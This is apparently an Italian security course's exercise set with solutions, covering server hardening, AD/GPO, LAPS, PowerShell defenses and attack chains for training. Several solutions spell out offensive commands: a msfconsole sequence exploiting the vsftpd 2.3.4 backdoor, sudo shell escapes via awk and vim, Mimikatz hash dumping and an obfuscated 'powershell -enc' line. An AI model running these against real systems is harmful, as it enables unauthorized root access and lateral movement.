Audit di un server fresco

Hai ssh-root su un Ubuntu 22.04 appena installato. Scrivi 5 comandi (one-liner) che useresti per un primo assessment rapido di sicurezza.

Soluzione tipica
awk -F: '$3==0 {print $1}' /etc/passwd — utenti UID 0

ss -tlnp — porte in listen e processi associati

2

sudoers: trova il problema

Analizza questa riga sudoers e identifica il problema:
developer ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/app.conf

Soluzione
Problemi multipli:
1. vim è un "shell escape binary" (GTFOBins): una volta dentro vim con sudo, :!/bin/bash apre shell root.
2. NOPASSWD significa che chiunque abbia compromesso l'account developer diventa root senza password.
3. La path-restriction /etc/app.conf è illusoria: vim accede comunque a qualsiasi file via :e /etc/shadow.
Fix: usare editor non-escape come sudoedit (che preserva ACL e non dà shell), o meglio rimuovere sudo e delegare modifica config via API applicativa.
3

Mount options di /tmp

Perché è importante montare /tmp con noexec, nosuid, nodev? Per ciascuna opzione indica quale classe di attacco mitiga.

Soluzione
noexec: il kernel rifiuta di eseguire binari da /tmp. Mitiga molti exploit che scaricano payload in /tmp e li lanciano (pattern comune di malware e reverse shell post-exploit).
nosuid: il bit SUID viene ignorato sui file in /tmp. Mitiga il caso in cui l'attaccante carica un binario SUID-root per escalation.
nodev: file device (/dev/hda ecc.) non funzionano se creati in /tmp. Mitiga attacchi esotici di creazione device file per bypass permessi.
Attenzione: alcune applicazioni (installer legacy, compilatori, apt in certe versioni) falliscono con noexec su /tmp. Testare in staging prima di produrre.

GPO e ordine di applicazione

Un PC Windows joined a dominio ha: (a) policy locale che dice "password min 8 caratteri", (b) GPO a livello Domain che dice "password min 12", (c) GPO su OU "Developers" che dice "password min 10". Il PC è membro dell'OU Developers. Qual è la policy effettiva e perché?

Soluzione
L'ordine LSDOU (Local → Site → Domain → OU) applica dal più esterno al più interno. In conflitto, vince l'ultima applicata, cioè la più vicina all'utente/PC = OU.
Policy effettiva: password min 10 caratteri (quella dell'OU Developers).
Se la GPO Domain avesse il flag Enforced, vincerebbe lei (12 caratteri) — Enforced inverte la logica LSDOU.
Verificare con gpresult /h report.html sul PC.
6

LAPS: risolve cosa esattamente

Spiega in 4-5 frasi perché LAPS è considerato un game-changer per la sicurezza AD, e cosa succede senza LAPS in uno scenario di incidente.

Soluzione
Senza LAPS, la password dell'account admin locale è tipicamente identica su tutti i PC aziendali (nasce da imaging standard). Compromesso un singolo PC (phishing, USB drop, drive-by), l'attaccante dump con Mimikatz l'hash dell'admin locale. Quell'hash funziona via Pass-the-Hash su tutti gli altri PC = movimento laterale libero. LAPS genera password random unica per ogni PC, custodita cifrata in attributo AD leggibile solo da gruppi autorizzati, e la ruota periodicamente (tipico 30 giorni). Risultato: hash diverso per macchina, PtH si ferma al primo PC. È l'unica mitigazione strutturale al pattern, più efficace di qualunque EDR.
7

PowerShell: difese contro LotL

Un attaccante esegue: powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA... (payload offuscato in base64). Elenca 4 difese che lascerebbero traccia o bloccherebbero.

Soluzione
1. Script Block Logging (Event ID 4104): registra lo script DECODIFICATO dopo l'esecuzione. L'offuscamento base64 non nasconde nulla al log.
2. AMSI (Antimalware Scan Interface): Defender scansiona il codice al momento dell'invocazione, pattern malevoli noti bloccati.
3. Constrained Language Mode: se attivo, molte operazioni (.NET reflection, COM, Add-Type) sono disabilitate → payload moderni non girano.
4. WDAC/AppLocker: policy che permettono PowerShell solo in Constrained mode per utenti non-admin, o bloccano powershell.exe per utenti standard.
5. Disabilitare PS v2: senza i controlli precedenti. Gli attaccanti la invocano esplicitamente come bypass (downgrade attack).
8

BitLocker: limiti

BitLocker con TPM+PIN protegge da quali minacce? Non protegge da quali altre?

Soluzione
Protegge da: furto fisico del dispositivo spento (attaccante rimuove disco, prova a montare su altro PC → cifrato, illeggibile); accesso amministrativo offline (live CD che monta il disco); smaltimento non sicuro di hardware dismesso.
Non protegge da: malware in esecuzione sul PC acceso (dati in RAM/disco in chiaro); attaccante remoto via exploit di rete; attaccante con credenziali valide; attaccante con accesso fisico a PC acceso e loggato; cold boot attack sofisticato (rari ma possibili).
BitLocker è un controllo complementare all'hardening software, non sostitutivo.

Nmap output: cosa ti dice

Hai lanciato nmap -sV 192.168.10.50 e ottenuto: porta 21/tcp open vsftpd 2.3.4, porta 22/tcp open OpenSSH 7.6p1, porta 80/tcp open Apache 2.4.29. Indica il rischio di ciascun servizio e il primo vettore che un attaccante proverebbe.

Soluzione
vsftpd 2.3.4: CVE-2011-2523 backdoor "smiley face" — exploit diretto via Metasploit exploit/unix/ftp/vsftpd_234_backdoor, shell root in pochi secondi. Rischio critico.
OpenSSH 7.6p1 (Ubuntu 18.04): CVE-2018-15473 (username enumeration) — utile per enumerare utenti validi prima di brute-force. Brute-force SSH con Hydra se PasswordAuth attivo. Rischio medio.
Apache 2.4.29: CVE-2017-15715 (file upload), CVE-2019-0211 (privilege escalation locale). Dipende dalla configurazione — se sono attivi mod_cgi o mod_php con upload non validato, exploit possibile. Rischio medio-alto.
Primo vettore: vsftpd, è instant-win se esposto.

Metasploit: flusso base

Scrivi la sequenza esatta di comandi msfconsole per exploitare il backdoor di vsftpd 2.3.4 sull'host 192.168.56.50.

Soluzione
msfconsole
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > show options
msf6 > set RHOSTS 192.168.56.50
msf6 > exploit (oppure run)

Il payload default di questo modulo è cmd/unix/interact, che dà shell root sul target dopo il trigger del backdoor (porta 6200). Se tutto va, prompt diventa $ senza username — id conferma uid=0(root).
11

Pass-the-Hash: la catena

Un attaccante compromette PC1 (workstation normale) come utente locale. Come arriva a domain admin via Pass-the-Hash, passo per passo?

Soluzione
1. Su PC1 ottiene shell come utente normale.
2. Privilege escalation locale (SUID, sudo misconfig, Windows token → SYSTEM o admin locale).
3. Come admin locale, lancia Mimikatz: sekurlsa::logonpasswords → dump hash NTLM di tutti gli utenti recentemente loggati su PC1.
4. Se un help desk technician si era loggato su PC1 per assistenza, il suo hash è lì.
5. Con quell'hash, Pass-the-Hash verso altri PC (che spesso accettano help desk group come admin locale).
6. Si ripete su PC2, PC3... finché trova hash di un utente con diritti Domain Admin (tipicamente durante logon di un sysadmin per manutenzione).
7. Game over: PtH con hash DA → accesso a Domain Controller → controllo totale dominio.
Mitigazione principale: Tier Model Microsoft — admin di Tier 0 (DC) non devono MAI loggarsi su Tier 2 (workstation). Protected Users group, LAPS, Credential Guard tutti complementari.
12

GTFOBins: privilege esc.

Un utente demo ha sudo -l che mostra: (root) NOPASSWD: /usr/bin/awk. Come diventa root?

Soluzione
awk supporta l'opzione -v e pattern di esecuzione che permettono shell escape. Da GTFOBins:
sudo awk 'BEGIN {system("/bin/bash")}'
Risultato: shell root immediata. awk è un interprete con capacità system(), abusabile quando accoppiato a sudo senza restrizioni.
Lezione difensiva: nessun binario con capacità shell-escape (awk, vim, less, find, more, man, ed, tar, nano...) dovrebbe essere in sudoers senza wrapping restrittivo. Alternative: sudoedit per edit file, script wrapper con input sanitizzato, delegate specifica via setcap.

Defense in depth: mappa i 6 layer

Per un'applicazione web aziendale (frontend + API + DB) esposta su Internet, disegna (in testo) i 6 layer di defense in depth con un controllo concreto per ciascuno.

Soluzione tipica
Perimetro: WAF cloud (Cloudflare/AWS WAF) + DDoS protection + firewall edge.
Segmentazione: VPC con subnet separate (DMZ pubblica, app layer, data layer), SG/NSG con policy least privilege.
Host: immagini container hardened (distroless), VM con CIS baseline applicato via Ansible.
Applicazione: secure coding (input validation), SAST/DAST in CI, dependency scanning (SCA), rate limiting API.
Dato: encryption at rest (TDE su DB, KMS per secrets), encryption in transit (TLS 1.3 ovunque incluso DB), row-level security.
Identità: IAM cloud + Zero Trust (MFA per ops), service principals per app-to-DB (niente password hard-coded), access review trimestrale.
14

Identità > IP: perché

Il tuo collega senior dice "l'era delle policy basate su IP è finita". Spiega in 4-5 frasi perché, con esempi concreti.

Soluzione
Le policy IP-based assumono che l'IP sia un proxy stabile dell'identità — assunzione rotta nei contesti moderni. (1) Container/Kubernetes: i pod hanno IP effimeri che cambiano a ogni deploy; una policy "deny IP 10.1.2.3 → DB" dura 5 minuti. (2) Smart working: lo stesso utente accede da home ISP diverso ogni giorno, IP change continuo. (3) Cloud autoscaling: i worker EC2 nascono e muoiono, IP pool condiviso. (4) BYOD: dispositivo personale cambia rete più volte al giorno.
Le policy identity-based (service principal, utente autenticato + device compliance) sono robuste perché l'identità è stabile anche quando l'IP cambia.

Log è tutto: un esempio storico

Perché il caso SolarWinds 2020 è anche una lezione su "log è tutto"? Cosa sarebbe servito per rilevarlo prima?

Soluzione
Il malware SUNBURST usava comunicazioni C2 mascherate da telemetria legittima Orion (domini tipo avsvmcloud.com). Chi aveva log DNS + SIEM con rilevazione di domini a bassa reputazione/NXDOMAIN patterns anomali aveva SEGNALI — ma nessuno li correlava. Il caso mostra che: (1) i log devono essere RACCOLTI (DNS, netflow, endpoint); (2) CORRELATI (singoli query anomale non bastano, servono pattern); (3) ANALIZZATI con aspettative di baseline (ogni software parla con i "suoi" domini noti, tutto il resto è anomalia). Molti clienti avevano i log ma non il secondo e terzo step. Il SOC moderno (Modulo 5) è costruito esattamente per questo: raccolta + correlazione + threat hunting.

Automazione: baseline applicata a scala

Dovresti applicare CIS Benchmark L1 a 500 server Linux. Disegna pipeline automatizzata a step.

Soluzione
1. Inventory: Ansible dynamic inventory da CMDB o cloud API (tag "env=prod", "os=ubuntu").
2. Apply: Ansible playbook (ruolo ansible-lockdown.ubuntu_22_cis), eseguito su target groups con strategia serial: 20% (batch per evitare outage massivi).
3. Verify: InSpec profile CIS Ubuntu 22, eseguito post-apply, genera report JSON.
4. Report: ingestion dei report in dashboard (Heimdall, Splunk, Grafana) con tracking hardening index nel tempo.
5. CI integration: pipeline GitLab che blocca deploy nuova VM se baseline non passa.
6. Drift detection: cronjob settimanale Inspec + alert su SIEM se hardening index scende sotto 80.
7. Exception management: risk register Git-versionato per eccezioni con scadenza.
